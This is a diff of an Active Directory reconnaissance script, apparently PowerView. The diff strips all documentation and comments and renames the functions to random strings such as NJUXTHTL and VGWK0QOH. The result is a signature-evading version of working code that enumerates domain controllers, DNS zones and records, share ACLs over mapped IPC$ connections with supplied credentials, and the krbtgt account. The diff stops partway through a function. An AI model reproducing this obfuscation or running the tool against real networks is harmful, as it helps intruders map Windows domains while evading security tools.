+        YBTPOIR8 @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | 4DS1B0PY -OutputFormat $OutputFormat
     }
 
     END {
         if ($LogonToken) {
-            Invoke-RevertToSelf -TokenHandle $LogonToken
+            JCUMHZOK -TokenHandle $LogonToken
         }
     }
 }
 
 
-function Get-PathAcl {
-<#
-.SYNOPSIS
+function VGWK0QOH {
 
-Enumerates the ACL for a given file path.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Add-RemoteConnection, Remove-RemoteConnection, ConvertFrom-SID  
-
-.DESCRIPTION
-
-Enumerates the ACL for a specified file/folder path, and translates
-the access rules for each entry into readable formats. If -Credential is passed,
-Add-RemoteConnection/Remove-RemoteConnection is used to temporarily map the remote share.
-
-.PARAMETER Path
-
-Specifies the local or remote path to enumerate the ACLs for.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target path.
-
-.EXAMPLE
-
-Get-PathAcl "\\SERVER\Share\"
-
-Returns ACLs for the given UNC share.
-
-.EXAMPLE
-
-gci .\test.txt | Get-PathAcl
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm', $SecPassword)
-Get-PathAcl -Path "\\SERVER\Share\" -Credential $Cred
-
-.INPUTS
-
-String
-
-One of more paths to enumerate ACLs for.
-
-.OUTPUTS
-
-PowerView.FileACL
-
-A custom object with the full path and associated ACL entries.
-
-.LINK
-
-https://support.microsoft.com/en-us/kb/305144
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.FileACL')]
@@ -3027,8 +1755,8 @@ https://support.microsoft.com/en-us/kb/305144
 
     BEGIN {
 
-        function Convert-FileRight {
-            # From Ansgar Wiechers at http://stackoverflow.com/questions/28029872/retrieving-security-descriptor-and-getting-number-for-filesystemrights
+        function QMGV6ZP6 {
+            
             [CmdletBinding()]
             Param(
                 [Int]
@@ -3069,7 +1797,7 @@ https://support.microsoft.com/en-us/kb/305144
 
             $Permissions = @()
 
-            # get simple permission
+            
             $Permissions += $SimplePermissions.Keys | ForEach-Object {
                               if (($FSR -band $_) -eq $_) {
                                 $SimplePermissions[$_]
@@ -3077,7 +1805,7 @@ https://support.microsoft.com/en-us/kb/305144
                               }
                             }
 
-            # get remaining extended permissions
+            
             $Permissions += $AccessMask.Keys | Where-Object { $FSR -band $_ } | ForEach-Object { $AccessMask[$_] }
             ($Permissions | Where-Object {$_}) -join ','
         }
@@ -3094,8 +1822,8 @@ https://support.microsoft.com/en-us/kb/305144
                 if (($TargetPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                     $HostComputer = (New-Object System.Uri($TargetPath)).Host
                     if (-not $MappedComputers[$HostComputer]) {
-                        # map IPC$ to this computer if it's not already
-                        Add-RemoteConnection -ComputerName $HostComputer -Credential $Credential
+                        
+                        MKK4QQPC -ComputerName $HostComputer -Credential $Credential
                         $MappedComputers[$HostComputer] = $True
                     }
                 }
@@ -3108,7 +1836,7 @@ https://support.microsoft.com/en-us/kb/305144
 
                     $Out = New-Object PSObject
                     $Out | Add-Member Noteproperty 'Path' $TargetPath
-                    $Out | Add-Member Noteproperty 'FileSystemRights' (Convert-FileRight -FSR $_.FileSystemRights.value__)
+                    $Out | Add-Member Noteproperty 'FileSystemRights' (QMGV6ZP6 -FSR $_.FileSystemRights.value__)
                     $Out | Add-Member Noteproperty 'IdentityReference' $Name
                     $Out | Add-Member Noteproperty 'IdentitySID' $SID
                     $Out | Add-Member Noteproperty 'AccessControlType' $_.AccessControlType
@@ -3117,44 +1845,20 @@ https://support.microsoft.com/en-us/kb/305144
                 }
             }
             catch {
-                Write-Verbose "[Get-PathAcl] error: $_"
+                Write-Verbose "[VGWK0QOH] error: $_"
             }
         }
     }
 
     END {
-        # remove the IPC$ mappings
-        $MappedComputers.Keys | Remove-RemoteConnection
+        
+        $MappedComputers.Keys | TUGT2IL3
     }
 }
 
 
 function Convert-LDAPProperty {
-<#
-.SYNOPSIS
 
-Helper that converts specific LDAP property result fields and outputs
-a custom psobject.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: None  
-
-.DESCRIPTION
-
-Converts a set of raw LDAP properties results from ADSI/LDAP searches
-into a proper PSObject. Used by several of the Get-Domain* function.
-
-.PARAMETER Properties
-
-Properties object to extract out LDAP fields for display.
-
-.OUTPUTS
-
-System.Management.Automation.PSCustomObject
-
-A custom PSObject with LDAP hashtable properties translated.
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('System.Management.Automation.PSCustomObject')]
@@ -3170,7 +1874,7 @@ A custom PSObject with LDAP hashtable properties translated.
     $Properties.PropertyNames | ForEach-Object {
         if ($_ -ne 'adspath') {
             if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {
-                # convert all listed sids (i.e. if multiple are listed in sidHistory)
+                
                 $ObjectProperties[$_] = $Properties[$_] | ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }
             }
             elseif ($_ -eq 'grouptype') {
@@ -3180,14 +1884,14 @@ A custom PSObject with LDAP hashtable properties translated.
                 $ObjectProperties[$_] = $Properties[$_][0] -as $SamAccountTypeEnum
             }
             elseif ($_ -eq 'objectguid') {
-                # convert the GUID to a string
+                
                 $ObjectProperties[$_] = (New-Object Guid (,$Properties[$_][0])).Guid
             }
             elseif ($_ -eq 'useraccountcontrol') {
                 $ObjectProperties[$_] = $Properties[$_][0] -as $UACEnum
             }
             elseif ($_ -eq 'ntsecuritydescriptor') {
-                # $ObjectProperties[$_] = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Properties[$_][0], 0
+                
                 $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Properties[$_][0], 0
                 if ($Descriptor.Owner) {
                     $ObjectProperties['Owner'] = $Descriptor.Owner
@@ -3211,21 +1915,21 @@ A custom PSObject with LDAP hashtable properties translated.
                 }
             }
             elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {
-                # convert timestamps
+                
                 if ($Properties[$_][0] -is [System.MarshalByRefObject]) {
-                    # if we have a System.__ComObject
+                    
                     $Temp = $Properties[$_][0]
                     [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                     [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                     $ObjectProperties[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
                 }
                 else {
-                    # otherwise just a string
+                    
                     $ObjectProperties[$_] = ([datetime]::FromFileTime(($Properties[$_][0])))
                 }
             }
             elseif ($Properties[$_][0] -is [System.MarshalByRefObject]) {
-                # try to convert misc com objects
+                
                 $Prop = $Properties[$_]
                 try {
                     $Temp = $Prop[$_][0]
@@ -3255,105 +1959,14 @@ A custom PSObject with LDAP hashtable properties translated.
 }
 
 
-########################################################
-#
-# Domain info functions below.
-#
-########################################################
 
-function Get-DomainSearcher {
-<#
-.SYNOPSIS
 
-Helper used by various functions that builds a custom AD searcher object.
 
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-Domain  
 
-.DESCRIPTION
 
-Takes a given domain and a number of customizations and returns a
-System.DirectoryServices.DirectorySearcher object. This function is used
-heavily by other LDAP/ADSI searcher functions (Verb-Domain*).
 
-.PARAMETER Domain
+function NJUXTHTL {
 
-Specifies the domain to use for the query, defaults to the current domain.
-
-.PARAMETER LDAPFilter
-
-Specifies an LDAP query string that is used to filter Active Directory objects.
-
-.PARAMETER Properties
-
-Specifies the properties of the output object to retrieve from the server.
-
-.PARAMETER SearchBase
-
-The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-Useful for OU queries.
-
-.PARAMETER SearchBasePrefix
-
-Specifies a prefix for the LDAP search string (i.e. "CN=Sites,CN=Configuration").
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to for the search.
-
-.PARAMETER SearchScope
-
-Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
-
-.PARAMETER ResultPageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ResultPageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ServerTimeLimit
-
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-
-.PARAMETER SecurityMasks
-
-Specifies an option for examining security information of a directory object.
-One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.
-
-.PARAMETER Tombstone
-
-Switch. Specifies that the searcher should also return deleted/tombstoned objects.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.EXAMPLE
-
-Get-DomainSearcher -Domain testlab.local
-
-Return a searcher for all objects in testlab.local.
-
-.EXAMPLE
-
-Get-DomainSearcher -Domain testlab.local -LDAPFilter '(samAccountType=805306368)' -Properties 'SamAccountName,lastlogon'
-
-Return a searcher for user objects in testlab.local and only return the SamAccountName and LastLogon properties.
-
-.EXAMPLE
-
-Get-DomainSearcher -SearchBase "LDAP://OU=secret,DC=testlab,DC=local"
-
-Return a searcher that searches through the specific ADS/LDAP search base (i.e. OU).
-
-.OUTPUTS
-
-System.DirectoryServices.DirectorySearcher
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('System.DirectoryServices.DirectorySearcher')]
@@ -3416,7 +2029,7 @@ System.DirectoryServices.DirectorySearcher
             $TargetDomain = $Domain
 
             if ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
-                # see if we can grab the user DNS logon domain from environment variables
+                
                 $UserDomain = $ENV:USERDNSDOMAIN
                 if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $UserDomain) {
                     $BindServer = "$($ENV:LOGONSERVER -replace '\\','').$UserDomain"
@@ -3424,20 +2037,20 @@ System.DirectoryServices.DirectorySearcher
             }
         }
         elseif ($PSBoundParameters['Credential']) {
-            # if not -Domain is specified, but -Credential is, try to retrieve the current domain name with Get-Domain
+            
             $DomainObject = Get-Domain -Credential $Credential
             $BindServer = ($DomainObject.PdcRoleOwner).Name
             $TargetDomain = $DomainObject.Name
         }
         elseif ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
-            # see if we can grab the user DNS logon domain from environment variables
+            
             $TargetDomain = $ENV:USERDNSDOMAIN
             if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $TargetDomain) {
                 $BindServer = "$($ENV:LOGONSERVER -replace '\\','').$TargetDomain"
             }
         }
         else {
-            # otherwise, resort to Get-Domain to retrieve the current domain object
+            
             write-verbose "get-domain"
             $DomainObject = Get-Domain
             $BindServer = ($DomainObject.PdcRoleOwner).Name
@@ -3445,7 +2058,7 @@ System.DirectoryServices.DirectorySearcher
         }
 
         if ($PSBoundParameters['Server']) {
-            # if there's not a specified server to bind to, try to pull a logon server from ENV variables
+            
             $BindServer = $Server
         }
 
@@ -3464,7 +2077,7 @@ System.DirectoryServices.DirectorySearcher
 
         if ($PSBoundParameters['SearchBase']) {
             if ($SearchBase -Match '^GC://') {
-                # if we're searching the global catalog, get the path in the right format
+                
                 $DN = $SearchBase.ToUpper().Trim('/')
                 $SearchString = ''
             }
@@ -3484,23 +2097,23 @@ System.DirectoryServices.DirectorySearcher
             }
         }
         else {
-            # transform the target domain name into a distinguishedName if an ADS search base is not specified
+            
             if ($TargetDomain -and ($TargetDomain.Trim() -ne '')) {
                 $DN = "DC=$($TargetDomain.Replace('.', ',DC='))"
             }
         }
 
         $SearchString += $DN
-        Write-Verbose "[Get-DomainSearcher] search base: $SearchString"
+        Write-Verbose "[NJUXTHTL] search base: $SearchString"
 
         if ($Credential -ne [Management.Automation.PSCredential]::Empty) {
-            Write-Verbose "[Get-DomainSearcher] Using alternate credentials for LDAP connection"
-            # bind to the inital search object using alternate credentials
+            Write-Verbose "[NJUXTHTL] Using alternate credentials for LDAP connection"
+            
             $DomainObject = New-Object DirectoryServices.DirectoryEntry($SearchString, $Credential.UserName, $Credential.GetNetworkCredential().Password)
             $Searcher = New-Object System.DirectoryServices.DirectorySearcher($DomainObject)
         }
         else {
-            # bind to the inital object using the current credentials
+            
             $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
         }
 
@@ -3532,7 +2145,7 @@ System.DirectoryServices.DirectorySearcher
         }
 
         if ($PSBoundParameters['Properties']) {
-            # handle an array of properties to load w/ the possibility of comma-separated strings
+            
             $PropertiesToLoad = $Properties| ForEach-Object { $_.Split(',') }
             $Null = $Searcher.PropertiesToLoad.AddRange(($PropertiesToLoad))
         }
@@ -3543,36 +2156,7 @@ System.DirectoryServices.DirectorySearcher
 
 
 function Convert-DNSRecord {
-<#
-.SYNOPSIS
 
-Helpers that decodes a binary DNS record blob.
-
-Author: Michael B. Smith, Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: None  
-
-.DESCRIPTION
-
-Decodes a binary blob representing an Active Directory DNS entry.
-Used by Get-DomainDNSRecord.
-
-Adapted/ported from Michael B. Smith's code at https://raw.githubusercontent.com/mmessano/PowerShell/master/dns-dump.ps1
-
-.PARAMETER DNSRecord
-
-A byte array representing the DNS record.
-
-.OUTPUTS
-
-System.Management.Automation.PSCustomObject
-
-Outputs custom PSObjects with detailed information about the DNS record entry.
-
-.LINK
-
-https://raw.githubusercontent.com/mmessano/PowerShell/master/dns-dump.ps1
-#>
 
     [OutputType('System.Management.Automation.PSCustomObject')]
     [CmdletBinding()]
@@ -3609,13 +2193,13 @@ https://raw.githubusercontent.com/mmessano/PowerShell/master/dns-dump.ps1
     }
 
     PROCESS {
-        # $RDataLen = [BitConverter]::ToUInt16($DNSRecord, 0)
+        
         $RDataType = [BitConverter]::ToUInt16($DNSRecord, 2)
         $UpdatedAtSerial = [BitConverter]::ToUInt32($DNSRecord, 8)
 
         $TTLRaw = $DNSRecord[12..15]
 
-        # reverse for big endian
+        
         $Null = [array]::Reverse($TTLRaw)
         $TTL = [BitConverter]::ToUInt32($TTLRaw, 0)
 
@@ -3648,7 +2232,7 @@ https://raw.githubusercontent.com/mmessano/PowerShell/master/dns-dump.ps1
         }
 
         elseif ($RDataType -eq 6) {
-            # TODO: how to implement properly? nested object?
+            
             $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
             $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'SOA'
         }
@@ -3660,13 +2244,13 @@ https://raw.githubusercontent.com/mmessano/PowerShell/master/dns-dump.ps1
         }
 
         elseif ($RDataType -eq 13) {
-            # TODO: how to implement properly? nested object?
+            
             $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
             $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'HINFO'
         }
 
         elseif ($RDataType -eq 15) {
-            # TODO: how to implement properly? nested object?
+            
             $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
             $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'MX'
         }
@@ -3685,13 +2269,13 @@ https://raw.githubusercontent.com/mmessano/PowerShell/master/dns-dump.ps1
         }
 
         elseif ($RDataType -eq 28) {
-            # TODO: how to implement properly? nested object?
+            
             $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
             $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'AAAA'
         }
 
         elseif ($RDataType -eq 33) {
-            # TODO: how to implement properly? nested object?
+            
             $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
             $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'SRV'
         }
@@ -3711,63 +2295,8 @@ https://raw.githubusercontent.com/mmessano/PowerShell/master/dns-dump.ps1
 }
 
 
-function Get-DomainDNSZone {
-<#
-.SYNOPSIS
+function INWPZXLC {
 
-Enumerates the Active Directory DNS zones for a given domain.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty  
-
-.PARAMETER Domain
-
-The domain to query for zones, defaults to the current domain.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to for the search.
-
-.PARAMETER Properties
-
-Specifies the properties of the output object to retrieve from the server.
-
-.PARAMETER ResultPageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ServerTimeLimit
-
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-
-.PARAMETER FindOne
-
-Only return one result object.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.EXAMPLE
-
-Get-DomainDNSZone
-
-Retrieves the DNS zones for the current domain.
-
-.EXAMPLE
-
-Get-DomainDNSZone -Domain dev.testlab.local -Server primary.testlab.local
-
-Retrieves the DNS zones for the dev.testlab.local domain, binding to primary.testlab.local.
-
-.OUTPUTS
-
-PowerView.DNSZone
-
-Outputs custom PSObjects with detailed information about the DNS zone.
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.DNSZone')]
@@ -3814,7 +2343,7 @@ Outputs custom PSObjects with detailed information about the DNS zone.
         if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
         if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
         if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
-        $DNSSearcher1 = Get-DomainSearcher @SearcherArguments
+        $DNSSearcher1 = NJUXTHTL @SearcherArguments
 
         if ($DNSSearcher1) {
             if ($PSBoundParameters['FindOne']) { $Results = $DNSSearcher1.FindOne()  }
@@ -3829,14 +2358,14 @@ Outputs custom PSObjects with detailed information about the DNS zone.
             if ($Results) {
                 try { $Results.dispose() }
                 catch {
-                    Write-Verbose "[Get-DomainDFSShare] Error disposing of the Results object: $_"
+                    Write-Verbose "[LDL959ST] Error disposing of the Results object: $_"
                 }
             }
             $DNSSearcher1.dispose()
         }
 
         $SearcherArguments['SearchBasePrefix'] = 'CN=MicrosoftDNS,DC=DomainDnsZones'
-        $DNSSearcher2 = Get-DomainSearcher @SearcherArguments
+        $DNSSearcher2 = NJUXTHTL @SearcherArguments
 
         if ($DNSSearcher2) {
             try {
@@ -3851,12 +2380,12 @@ Outputs custom PSObjects with detailed information about the DNS zone.
                 if ($Results) {
                     try { $Results.dispose() }
                     catch {
-                        Write-Verbose "[Get-DomainDNSZone] Error disposing of the Results object: $_"
+                        Write-Verbose "[INWPZXLC] Error disposing of the Results object: $_"
                     }
                 }
             }
             catch {
-                Write-Verbose "[Get-DomainDNSZone] Error accessing 'CN=MicrosoftDNS,DC=DomainDnsZones'"
+                Write-Verbose "[INWPZXLC] Error accessing 'CN=MicrosoftDNS,DC=DomainDnsZones'"
             }
             $DNSSearcher2.dispose()
         }
@@ -3864,79 +2393,8 @@ Outputs custom PSObjects with detailed information about the DNS zone.
 }
 
 
-function Get-DomainDNSRecord {
-<#
-.SYNOPSIS
+function X6YBHBNN {
 
-Enumerates the Active Directory DNS records for a given zone.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty, Convert-DNSRecord  
-
-.DESCRIPTION
-
-Given a specific Active Directory DNS zone name, query for all 'dnsNode'
-LDAP entries using that zone as the search base. Return all DNS entry results
-and use Convert-DNSRecord to try to convert the binary DNS record blobs.
-
-.PARAMETER ZoneName
-
-Specifies the zone to query for records (which can be enumearted with Get-DomainDNSZone).
-
-.PARAMETER Domain
-
-The domain to query for zones, defaults to the current domain.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to for the search.
-
-.PARAMETER Properties
-
-Specifies the properties of the output object to retrieve from the server.
-
-.PARAMETER ResultPageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ServerTimeLimit
-
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-
-.PARAMETER FindOne
-
-Only return one result object.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.EXAMPLE
-
-Get-DomainDNSRecord -ZoneName testlab.local
-
-Retrieve all records for the testlab.local zone.
-
-.EXAMPLE
-
-Get-DomainDNSZone | Get-DomainDNSRecord
-
-Retrieve all records for all zones in the current domain.
-
-.EXAMPLE
-
-Get-DomainDNSZone -Domain dev.testlab.local | Get-DomainDNSRecord -Domain dev.testlab.local
-
-Retrieve all records for all zones in the dev.testlab.local domain.
-
-.OUTPUTS
-
-PowerView.DNSRecord
-
-Outputs custom PSObjects with detailed information about the DNS record entry.
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.DNSRecord')]
@@ -3988,7 +2446,7 @@ Outputs custom PSObjects with detailed information about the DNS record entry.
         if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
         if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
         if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
-        $DNSSearcher = Get-DomainSearcher @SearcherArguments
+        $DNSSearcher = NJUXTHTL @SearcherArguments
 
         if ($DNSSearcher) {
             if ($PSBoundParameters['FindOne']) { $Results = $DNSSearcher.FindOne() }
@@ -3998,9 +2456,9 @@ Outputs custom PSObjects with detailed information about the DNS record entry.
                     $Out = Convert-LDAPProperty -Properties $_.Properties | Select-Object name,distinguishedname,dnsrecord,whencreated,whenchanged
                     $Out | Add-Member NoteProperty 'ZoneName' $ZoneName
 
-                    # convert the record and extract the properties
+                    
                     if ($Out.dnsrecord -is [System.DirectoryServices.ResultPropertyValueCollection]) {
-                        # TODO: handle multiple nested records properly?
+                        
                         $Record = Convert-DNSRecord -DNSRecord $Out.dnsrecord[0]
                     }
                     else {
@@ -4017,7 +2475,7 @@ Outputs custom PSObjects with detailed information about the DNS record entry.
                     $Out
                 }
                 catch {
-                    Write-Warning "[Get-DomainDNSRecord] Error: $_"
+                    Write-Warning "[X6YBHBNN] Error: $_"
                     $Out
                 }
             }
@@ -4025,7 +2483,7 @@ Outputs custom PSObjects with detailed information about the DNS record entry.
             if ($Results) {
                 try { $Results.dispose() }
                 catch {
-                    Write-Verbose "[Get-DomainDNSRecord] Error disposing of the Results object: $_"
+                    Write-Verbose "[X6YBHBNN] Error disposing of the Results object: $_"
                 }
             }
             $DNSSearcher.dispose()
@@ -4035,49 +2493,7 @@ Outputs custom PSObjects with detailed information about the DNS record entry.
 
 
 function Get-Domain {
-<#
-.SYNOPSIS
 
-Returns the domain object for the current (or specified) domain.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: None  
-
-.DESCRIPTION
-
-Returns a System.DirectoryServices.ActiveDirectory.Domain object for the current
-domain or the domain specified with -Domain X.
-
-.PARAMETER Domain
-
-Specifies the domain name to query for, defaults to the current domain.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.EXAMPLE
-
-Get-Domain -Domain testlab.local
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Get-Domain -Credential $Cred
-
-.OUTPUTS
-
-System.DirectoryServices.ActiveDirectory.Domain
-
-A complex .NET domain object.
-
-.LINK
-
-http://social.technet.microsoft.com/Forums/scriptcenter/en-US/0c5b3f83-e528-4d49-92a4-dee31f4b481c/finding-the-dn-of-the-the-domain-without-admodule-in-powershell?forum=ITCG
-#>
 
     [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
     [CmdletBinding()]
@@ -4101,7 +2517,7 @@ http://social.technet.microsoft.com/Forums/scriptcenter/en-US/0c5b3f83-e528-4d49
                 $TargetDomain = $Domain
             }
             else {
-                # if no domain is supplied, extract the logon domain from the PSCredential passed
+                
                 $TargetDomain = $Credential.GetNetworkCredential().Domain
                 Write-Verbose "[Get-Domain] Extracted domain '$TargetDomain' from -Credential"
             }
@@ -4136,73 +2552,8 @@ http://social.technet.microsoft.com/Forums/scriptcenter/en-US/0c5b3f83-e528-4d49
 }
 
 
-function Get-DomainController {
-<#
-.SYNOPSIS
+function RP7TH4PM {
 
-Return the domain controllers for the current (or specified) domain.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-DomainComputer, Get-Domain  
-
-.DESCRIPTION
-
-Enumerates the domain controllers for the current or specified domain.
-By default built in .NET methods are used. The -LDAP switch uses Get-DomainComputer
-to search for domain controllers.
-
-.PARAMETER Domain
-
-The domain to query for domain controllers, defaults to the current domain.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to.
-
-.PARAMETER LDAP
-
-Switch. Use LDAP queries to determine the domain controllers instead of built in .NET methods.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.EXAMPLE
-
-Get-DomainController -Domain 'test.local'
-
-Determine the domain controllers for 'test.local'.
-
-.EXAMPLE
-
-Get-DomainController -Domain 'test.local' -LDAP
-
-Determine the domain controllers for 'test.local' using LDAP queries.
-
-.EXAMPLE
-
-'test.local' | Get-DomainController
-
-Determine the domain controllers for 'test.local'.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Get-DomainController -Credential $Cred
-
-.OUTPUTS
-
-PowerView.Computer
-
-Outputs custom PSObjects with details about the enumerated domain controller if -LDAP is specified.
-
-System.DirectoryServices.ActiveDirectory.DomainController
-
-If -LDAP isn't specified.
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.Computer')]
@@ -4234,10 +2585,10 @@ If -LDAP isn't specified.
         if ($PSBoundParameters['LDAP'] -or $PSBoundParameters['Server']) {
             if ($PSBoundParameters['Server']) { $Arguments['Server'] = $Server }
 
-            # UAC specification for domain controllers
+            
             $Arguments['LDAPFilter'] = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
 
-            Get-DomainComputer @Arguments
+            VVVCIHJ3 @Arguments
         }
         else {
             $FoundDomain = Get-Domain @Arguments
@@ -4250,46 +2601,7 @@ If -LDAP isn't specified.
 
 
 function Get-Forest {
-<#
-.SYNOPSIS
 
-Returns the forest object for the current (or specified) forest.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: ConvertTo-SID  
-
-.DESCRIPTION
-
-Returns a System.DirectoryServices.ActiveDirectory.Forest object for the current
-forest or the forest specified with -Forest X.
-
-.PARAMETER Forest
-
-The forest name to query for, defaults to the current forest.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target forest.
-
-.EXAMPLE
-
-Get-Forest -Forest external.domain
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Get-Forest -Credential $Cred
-
-.OUTPUTS
-
-System.Management.Automation.PSCustomObject
-
-Outputs a PSObject containing System.DirectoryServices.ActiveDirectory.Forest in addition
-to the forest root domain SID.
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('System.Management.Automation.PSCustomObject')]
@@ -4314,7 +2626,7 @@ to the forest root domain SID.
                 $TargetForest = $Forest
             }
             else {
-                # if no domain is supplied, extract the logon domain from the PSCredential passed
+                
                 $TargetForest = $Credential.GetNetworkCredential().Domain
                 Write-Verbose "[Get-Forest] Extracted domain '$Forest' from -Credential"
             }
@@ -4340,17 +2652,17 @@ to the forest root domain SID.
             }
         }
         else {
-            # otherwise use the current forest
+            
             $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
         }
 
         if ($ForestObject) {
-            # get the SID of the forest root
+            
             if ($PSBoundParameters['Credential']) {
-                $ForestSid = (Get-DomainUser -Identity "krbtgt" -Domain $ForestObject.RootDomain.Name -Credential $Credential).objectsid
+                $ForestSid = (YBTPOIR8 -Identity "krbtgt" -Domain $ForestObject.RootDomain.Name -Credential $Credential).objectsid
             }
             else {
-                $ForestSid = (Get-DomainUser -Identity "krbtgt" -Domain $ForestObject.RootDomain.Name).objectsid
+                $ForestSid = (YBTPOIR8 -Identity "krbtgt" -Domain $ForestObject.RootDomain.Name).objectsid
             }
 
             $Parts = $ForestSid -Split '-'
@@ -4362,48 +2674,8 @@ to the forest root domain SID.
 }
 
 
-function Get-ForestDomain {
-<#
-.SYNOPSIS
+function 6H2K42C0 {
 
-Return all domains for the current (or specified) forest.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
